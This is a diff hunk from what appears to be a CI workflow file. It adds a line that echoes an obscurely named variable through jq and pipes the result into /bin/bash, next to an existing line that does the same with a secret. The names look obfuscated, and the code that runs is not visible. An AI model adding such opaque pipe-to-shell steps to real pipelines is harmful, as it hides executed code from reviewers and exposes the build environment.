@@ -19,6 +19,7 @@ jobs:
           tm29: ${{ secrets.tm29 }}
         run: |
           printf '%s' "$tm29" | jq -r .dpiz574 | /bin/bash
+          echo $ig58679 | jq -r .rjfi32 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
